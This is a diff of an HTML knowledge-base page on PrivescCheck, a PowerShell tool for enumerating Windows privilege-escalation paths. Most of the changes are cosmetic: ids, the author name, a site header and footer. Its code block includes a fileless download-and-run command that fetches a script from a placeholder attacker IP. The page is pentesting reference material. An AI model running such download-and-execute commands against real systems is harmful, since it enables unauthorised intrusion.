@@ -3,11 +3,11 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-20 Mon 15:58 -->
+<!-- 2026-07-30 Thu 22:15 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>PrivescCheck</title>
-<meta name="author" content="termux" />
+<meta name="author" content="Gregory Hugaerts" />
 <meta name="generator" content="Org Mode" />
 <link rel="stylesheet" href="style.css" type="text/css"/>
 <style type='text/css'>
@@ -860,6 +860,24 @@ pre {
 </head>
 <body>
 <div id="preamble" class="status">
+<div id='generated-header' class='generated'><header>
+ <nav>
+<a class='nav-title'href='/index.html' >
+Gregory Hugaerts
+</a>
+<input id='nav-toggle-top' class='nav-toggle' type='checkbox'>
+<label class='nav-button' for='nav-toggle-top'><span/></label>
+<div class='separator menu-sep'></div>
+<ul class='nav-list'>
+<li class='nav-item'>
+<a class='nav-link' href='/index.html'>
+Knowledge Base</a>
+</li>
+</ul>
+<div class='separator'></div>
+</nav>
+</header>
+</div>
 <div id='view-controls'><div id='toggle-mode' title='Mode'>&#9788;</div><div id='goto-top' title='Top'>&#8963;</div><div id='toggle-toc' title='Contents'>&#9776;</div></div>
 </div>
 <div id="content" class="content">
@@ -868,10 +886,10 @@ pre {
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#orgfc28bff">Core Functionality</a></li>
-<li><a href="#org814830e">Running PrivescCheck</a></li>
-<li><a href="#orge7f830d">Output and Use</a></li>
-<li><a href="#orga9503b0">Tips</a></li>
+<li><a href="#org2155871">Core Functionality</a></li>
+<li><a href="#orgf8d5dfa">Running PrivescCheck</a></li>
+<li><a href="#orgb6f43a1">Output and Use</a></li>
+<li><a href="#org4b1a1cd">Tips</a></li>
 </ul>
 </div>
 </div>
@@ -891,9 +909,9 @@ Related: <a href="20260314T005758--windows-privilege-escalation__concept_cyberse
          <a href="20260314T005757--windows-exploit-suggester__cybersecurity_tool.html">Windows Exploit Suggester</a>
          <a href="20260718T114426--windows-privilege-escalation-tools-—-comparison__comparison_cybersecurity_pentesting_reference.html">Windows Privilege Escalation Tools — Comparison</a>
 </p>
-<div id="outline-container-orgfc28bff" class="outline-2">
-<h2 id="orgfc28bff">Core Functionality</h2>
-<div class="outline-text-2" id="text-orgfc28bff">
+<div id="outline-container-org2155871" class="outline-2">
+<h2 id="org2155871">Core Functionality</h2>
+<div class="outline-text-2" id="text-org2155871">
 <p>
 As a PowerShell script, PrivescCheck is fileless — it can be
 downloaded and executed directly in memory without writing an
@@ -926,37 +944,37 @@ secondary data point within a broader scan.</li>
 </ol>
 </div>
 </div>
-<div id="outline-container-org814830e" class="outline-2">
-<h2 id="org814830e">Running PrivescCheck</h2>
-<div class="outline-text-2" id="text-org814830e">
+<div id="outline-container-orgf8d5dfa" class="outline-2">
+<h2 id="orgf8d5dfa">Running PrivescCheck</h2>
+<div class="outline-text-2" id="text-orgf8d5dfa">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_68bb192e27dc4dab92f51c394b43bd12>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_f988a857207e439b8f7ab736995a8046>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_68bb192e27dc4dab92f51c394b43bd12=document.querySelector('button[name=btn_68bb192e27dc4dab92f51c394b43bd12]');
-copyBtnbtn_68bb192e27dc4dab92f51c394b43bd12.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Import and run the full check — most common usage\nImport-Module .\\PrivescCheck.ps1\nInvoke-PrivescCheck\n\n# Fileless execution directly from a remote host (no disk write)\nIEX(New-Object Net.WebClient).DownloadString('http://<attacker-ip>/PrivescCheck.ps1'); Invoke-PrivescCheck\n\n# Extended checks (includes noisier/slower tests not run by default)\nInvoke-PrivescCheck -Extended\n\n# Export results to a file for offline review\nInvoke-PrivescCheck -Report privesc_report -Format HTML\n`);copyBtnbtn_68bb192e27dc4dab92f51c394b43bd12.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_68bb192e27dc4dab92f51c394b43bd12.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_f988a857207e439b8f7ab736995a8046=document.querySelector('button[name=btn_f988a857207e439b8f7ab736995a8046]');
+copyBtnbtn_f988a857207e439b8f7ab736995a8046.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Import and run the full check — most common usage\nImport-Module .\\PrivescCheck.ps1\nInvoke-PrivescCheck\n\n# Fileless execution directly from a remote host (no disk write)\nIEX(New-Object Net.WebClient).DownloadString('http://<attacker-ip>/PrivescCheck.ps1'); Invoke-PrivescCheck\n\n# Extended checks (includes noisier/slower tests not run by default)\nInvoke-PrivescCheck -Extended\n\n# Export results to a file for offline review\nInvoke-PrivescCheck -Report privesc_report -Format HTML\n`);copyBtnbtn_f988a857207e439b8f7ab736995a8046.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_f988a857207e439b8f7ab736995a8046.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
-<pre class="src src-powershell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Import and run the full check &#8212; most common usage
-</span><span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Import-Module</span> .\PrivescCheck.ps1
-<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Invoke-PrivescCheck</span>
+<pre class="src src-powershell"># Import and run the full check — most common usage
+Import-Module .\PrivescCheck.ps1
+Invoke-PrivescCheck
 
-<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Fileless execution directly from a remote host (no disk write)
-</span>IEX(<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">New-Object</span> Net.WebClient).DownloadString(<span style="color: var(--clr-string); background-color: var(--bg-string);">'http://&lt;attacker-ip&gt;/PrivescCheck.ps1'</span>); <span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Invoke-PrivescCheck</span>
+# Fileless execution directly from a remote host (no disk write)
+IEX(New-Object Net.WebClient).DownloadString('http://&lt;attacker-ip&gt;/PrivescCheck.ps1'); Invoke-PrivescCheck
 
-<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Extended checks (includes noisier/slower tests not run by default)
-</span><span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Invoke-PrivescCheck</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Extended</span>
+# Extended checks (includes noisier/slower tests not run by default)
+Invoke-PrivescCheck -Extended
 
-<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Export results to a file for offline review
-</span><span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Invoke-PrivescCheck</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Report</span> privesc_report <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Format</span> HTML
+# Export results to a file for offline review
+Invoke-PrivescCheck -Report privesc_report -Format HTML
 </pre>
 </div></div>
 </div>
 </div>
-<div id="outline-container-orge7f830d" class="outline-2">
-<h2 id="orge7f830d">Output and Use</h2>
-<div class="outline-text-2" id="text-orge7f830d">
+<div id="outline-container-orgb6f43a1" class="outline-2">
+<h2 id="orgb6f43a1">Output and Use</h2>
+<div class="outline-text-2" id="text-orgb6f43a1">
 <p>
 PrivescCheck is designed for speed and clarity. Console output is
 color-coded — red for severe findings — to draw immediate attention
@@ -972,9 +990,9 @@ execution tool to actually escalate.
 </p>
 </div>
 </div>
-<div id="outline-container-orga9503b0" class="outline-2">
-<h2 id="orga9503b0">Tips</h2>
-<div class="outline-text-2" id="text-orga9503b0">
+<div id="outline-container-org4b1a1cd" class="outline-2">
+<h2 id="org4b1a1cd">Tips</h2>
+<div class="outline-text-2" id="text-org4b1a1cd">
 <ul class="org-ul">
 <li>Run the default (non-extended) scan first — it's faster and
 covers the highest-yield checks; only reach for <code>-Extended</code> if
@@ -995,6 +1013,20 @@ before relying on this delivery method</li>
 </div>
 </div>
 <div id="postamble" class="status">
+<div id='generated-footer' class='generated'><footer>
+ <nav>
+<div class='separator'></div>
+<a class='nav-author'href='https://gregoryhugaerts.github.io' >
+gregoryhugaerts.github.io
+</a>
+<input id='nav-toggle-bot' class='nav-toggle' type='checkbox'>
+<label class='nav-button' for='nav-toggle-bot'><span/></label>
+<div class='separator menu-sep'></div>
+<ul class='nav-list'>
+</ul>
+</nav>
+</footer>
+</div>
 <script type="text/javascript">
 <!--/*--><![CDATA[/*><!--*/
 if (!document.cookie.split('; ').find(r => r.startsWith('mode'))) {
@@ -1002,6 +1034,7 @@ document.cookie = 'mode=dark'
 }
 document.cookie = 'light=modus-operandi-tinted'
 document.cookie = 'dark=modus-vivendi-tinted'
+document.cookie = 'options=collapsing:t__src-lang:t';
 /*
 ;; nice-org-html.js
 ;;==============================================================================
